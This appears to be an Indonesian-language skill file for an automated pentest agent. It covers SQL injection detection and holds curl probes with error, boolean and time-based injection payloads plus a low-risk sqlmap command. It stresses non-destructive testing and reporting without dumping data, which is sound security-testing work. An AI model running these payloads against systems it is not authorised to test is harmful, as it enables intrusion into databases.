---
name: ujiscan-vuln-sqli
description: "SQL Injection detection — error-based, boolean blind, time-based. Use when target has DB-backed parameters. Triggers: sqli, sql injection, database injection, sqlmap."
version: 1.0.0
phase: ["vulnscan"]
category: ["vulnscan"]
tools: ["sqlmap", "curl", "nosqlmap"]
tags: ["vuln", "detection", "verification"]
---

# SQLI Detection# SQL Injection Detection

## Langkah Pengujian (non-destruktif dulu)

### 1. Identifikasi param DB-backed
Endpoint dengan `id=`, `?page=`, `?user=`, `?cat=` — apapun yang mem-filter data.

### 2. Probe manual ringan
```bash
# Error-based
curl -s "http://target/item?id=1'" | grep -iE "sql|syntax|mysql|postgres|sqlite|ora-[0-9]"

# Boolean (bandingkan respons)
curl -s "http://target/item?id=1 AND 1=1" | wc -c
curl -s "http://target/item?id=1 AND 1=2" | wc -c

# Time-based (hanya jika API lambat oleh design)
curl -s -m 15 "http://target/item?id=1;SELECT SLEEP(5)" 
```

### 3. Auto-detection aman dgn sqlmap
```bash
sqlmap -u "http://target/item?id=1" --batch --technique=BEUSTQ --level=1 --risk=1
# Tanpa --dump! Tanpa --os-shell! (non-destruktif)
```

## Tanda Temuan
- Error DB di response → error-based
- Perbedaan respons boolean → blind
- Delay → time-based
- sqlmap report "injectable" → konfirmasi

## Klasifikasi
- SQLi terkonfirmasi di endpoint dengan data sensitif: CRITICAL
- SQLi blind (tanpa dump terverifikasi): HIGH
- NoSQLi (MongoDB): HIGH

## Verifikasi (wajib)
1. sqlmap beri bukti teknik + payload
2. Re-run boolean probe untuk reproducible
3. LAPOR TANPA dump data — cukup bukti injeksi

